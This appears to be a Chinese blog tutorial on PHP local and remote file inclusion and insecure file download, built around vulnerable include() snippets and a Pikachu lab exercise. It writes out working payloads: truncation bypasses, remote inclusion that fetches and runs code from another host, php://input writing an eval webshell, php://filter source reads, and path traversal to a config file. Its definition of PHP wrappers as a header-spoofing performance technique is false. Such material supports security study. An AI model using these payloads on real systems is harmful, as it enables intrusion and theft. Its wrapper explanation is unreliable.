---
title: 文件包含漏洞
date: 2026-06-08 14:00:00
categories:
  - Web安全
  - 文件包含
tags:
  - 文件包含
---

# 一、漏洞检测与危害
## 1.概念
+ 文件包含：开发中用于复用代码；
+ 漏洞成因：可控参数未过滤，可引入外部文件当做PHP代码执行。
+ 危害：执行恶意图片木马、读取网站配置等敏感文件，造成源码泄露、服务器被控。

## 2.漏洞检测
+ 白盒：代码审计查看include/include_once/require/require_once参数是否可控
+ 黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试

---

# 二、本地包含 & 远程文件包含
## 1. 本地文件包含（LFI）
仅读取服务器本地已有文件，常搭配文件上传使用

### (1) 无后缀拼接限制
服务端代码`1.php`

```php
<?php
$filename=$_GET['filename'];
include ( $filename);
?>
```

新建`1.txt`：`<?php phpinfo(); ?>`  
访问:`http://localhost/include/upload.php?filename=1.txt`

> txt文件被PHP解析执行。
>

### (2)服务端自动拼接后缀`.html`（`upload2.php`）
```php
<?php
$filename=$_GET['filename'];
include($filename.".html");
?>
```

直接传`1.txt`会拼接成`1.txt.html`报错，两种绕过：

#### ①%00截断
（PHP<5.3，magic_quotes_gpc关闭)

+ 原理：%00终止字符串，`.html`被舍弃。
+ 访问：`http://localhost/include/upload2.php?filename=1.txt%00`

#### ②超长路径截断
+ 原理：Windows文件名上限255字符、Linux4096字符，大量`.`填充耗尽路径，末尾.html被丢弃.
+ `?filename=1.txt......................................................................`

### (3) 远程文件包含(RFI)
+ 可加载外网文件，危害更大
+ 前提：`php.ini`中`allow_url_include = On`

#### ①无限制远程包含
本地：`?filename=http://192.168.0.13:88/1.txt`  
远程1.txt内容`<?php phpinfo(); ?>`，远程代码被本地服务器执行。

#### ②服务拼接后缀.html绕过
代码：`include($filename.".html");`

+ 方式1：`?filename=http://192.168.0.13:88/1.txt?`  
问号作为URL参数，`.html`变成无效参数被忽略
+ 方式2：`?filename=http://192.168.0.13:88/1.txt%23`  
%23是#，注释掉后面拼接的.html (%00 截断也可以）

---

# 三、PHP常用伪协议
PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。

| 协议 | PHP版本 | allow_url_fopen | allow_url_include | 使用示例 |
| --- | --- | --- | --- | --- |
| file:// | ≥5.2 | off/on | off/on | ?file=file://D/soft/phpStudy/WWW/phpcode.txt |
| php://filter | ≥5.2 | off/on | off/on | ?file=php://filter/read=convert.base64-encode/resource=.index.php |
| php://input | ≥5.2 | off/on | on | GET传参，POST写入PHP代码 |
| zip:// | ≥5.2 | off/on | off/on | ?file=zip://D/xxx.zip/23phpcode.txt |
| compress.bzip2:// | ≥5.2 | off/on | off/on | ?file=compress.bzip2://xxx.bz2 |
| compress.zlib:// | ≥5.2 | off/on | off/on | ?file=compress.zlib://xxx.gz |
| data:// | ≥5.2 | on | on | ?file=data://text/plain, |


## 1、http/https协议
远程包含常规协议。

(高亮的部分是伪协议）

```plain
http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
```

## 2、php://filter（读取源码，最常用）
+ 作用：读取目标文件并编码输出，避免源码直接被浏览器解析。
+ 常用过滤器：`convert.base64-encode`
+ 示例 payload：`http://localhost/include/upload.php?filename=php://filter/read=convert.base64-encode/resource=upload.php`  
拿到base64字符串后解码得到源代码。
+ 附加过滤器分类：
    - 字符串：string.rot13、string.toupper、string.tolower、string.strip_tags
    - 转换：convert.base64系列、quoted-printable
    - 压缩：bzip2、zlib
    - 加密：mdecrypt系列

## 3、php://input（POST传入代码执行）
+ 原理：读取POST原始数据当做PHP代码执行
+ 示例：
    -  执行系统命令ver  
GET：`?filename=php://input`  
POST数据：`<?php system('ver');?>`
    - 写入一句话木马shell.php  
GET：`?filename=php://input`  
POST：`<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd]); ?>'); ?>`  
访问`shell.php`，POST `cmd=phpinfo();`即可连接蚁剑。

## 4、file://协议（读取本地绝对路径文件）
+ 示例：
    - 读取hosts：  
`?filename=file:///C:\Windows\System32\drivers\etc\hosts`

## 5、data://协议（内嵌PHP代码执行）
两种写法：

```plain
?filename=data://text/plain,<?php phpinfo();?>
?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

---

# 四、不安全文件下载漏洞
## 1. 原理
+ 本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如/uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
+ 核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，../(Unix/Linux)或..\(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的../../../../,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。

## 2. Pikachu靶场实操
1. 下载链接原地址：  
`http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png`
2. 利用目录穿越payload：  
`http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php`  
直接下载网站数据库配置等敏感源码。

---

# 五、补充
文件下载与文件包含原理相近：

+ 文件包含：文件被PHP引擎执行
+ 文件下载：文件直接二进制输出下载到本地

